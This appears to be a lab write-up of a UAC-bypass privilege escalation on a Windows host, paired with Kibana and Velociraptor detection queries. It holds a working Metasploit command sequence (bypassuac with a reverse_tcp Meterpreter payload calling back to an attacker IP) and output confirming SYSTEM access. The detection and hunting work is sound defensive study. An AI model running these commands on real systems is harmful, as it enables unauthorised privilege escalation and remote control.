# Privilege Escalation Phase Analysis

## Objective
After obtaining a reverse shell on WS1 as the standard user `normaluser`, the attacker escalates privileges to `SYSTEM` using a UAC bypass technique. This enables credential dumping, lateral movement, and persistence.

**MITRE ATT&CK Mapping:**  
- **Tactic:** TA0004 – Privilege Escalation  
- **Technique:** T1548.002 – Bypass User Account Control  

**Note:** WS2 (`192.168.1.30`) was not involved in this phase.

---

## Attack Execution

From the Meterpreter session (`normaluser`), the attacker elevates privileges using Metasploit:

```text
meterpreter > background

msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac
msf6 exploit(windows/local/bypassuac) > set SESSION 1
msf6 exploit(windows/local/bypassuac) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac) > set LHOST 192.168.1.5
msf6 exploit(windows/local/bypassuac) > set LPORT 4445
msf6 exploit(windows/local/bypassuac) > run
```

A new Meterpreter session is opened with elevated privileges.

### Verification

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## Detection in Kibana

UAC bypass activity generates Windows Security and Sysmon logs.

| Event ID | Source | Description |
|----------|--------|-------------|
| 4688 | Windows Security | Process creation (eventvwr.exe / sdclt.exe) |
| 1 | Sysmon | Detailed process creation |
| 4673 | Windows Security | Sensitive privilege use |

---

## Kibana Detection Queries

Detect suspicious event viewer execution:

```text
winlog.event_id: 4688 AND process.executable: *eventvwr.exe AND winlog.event_data.ParentProcessName: *cmd.exe
```

Detect sdclt abuse:

```text
winlog.event_id: 4688 AND process.executable: *sdclt.exe AND NOT winlog.event_data.ParentProcessName: *explorer.exe
```

---

## Example Event (WS1)

| Field | Value |
|------|------|
| event_id | 4688 |
| process.executable | C:\Windows\System32\eventvwr.exe |
| parent_process | C:\Windows\System32\cmd.exe |
| host.name | WS1 |

---

## Recommended Detection Rules

### Rule 1: UAC Bypass via eventvwr.exe
```text
winlog.event_id: 4688 AND process.executable: *eventvwr.exe AND winlog.event_data.ParentProcessName: *cmd.exe
```

### Rule 2: UAC Bypass via sdclt.exe
```text
winlog.event_id: 4688 AND process.executable: *sdclt.exe AND NOT winlog.event_data.ParentProcessName: *explorer.exe
```

---

## Post-Attack Hunting (Velociraptor)

### Artifact
- Windows.System.Pslist

### Query
```sql
SELECT Name, Pid, ParentPid, CommandLine
FROM hunt_results()
WHERE Name =~ '(?i)eventvwr.exe|sdclt.exe'
```

### Expected Findings
- WS1: eventvwr.exe spawned from cmd.exe  
- WS2: No activity detected  

---

## Cleanup

```text
sessions -k 2
```

---

## Screenshot Evidence

- Metasploit console showing successful SYSTEM session  
- `getuid` output confirming NT AUTHORITY\SYSTEM  
- Kibana query showing eventvwr.exe execution  
- Velociraptor process hunt results  

---

## Conclusion

The privilege escalation phase successfully elevated access from `normaluser` to `SYSTEM` on WS1 using a UAC bypass technique. Detection was achieved via Event ID 4688, highlighting suspicious execution of trusted Windows binaries. WS2 remained unaffected.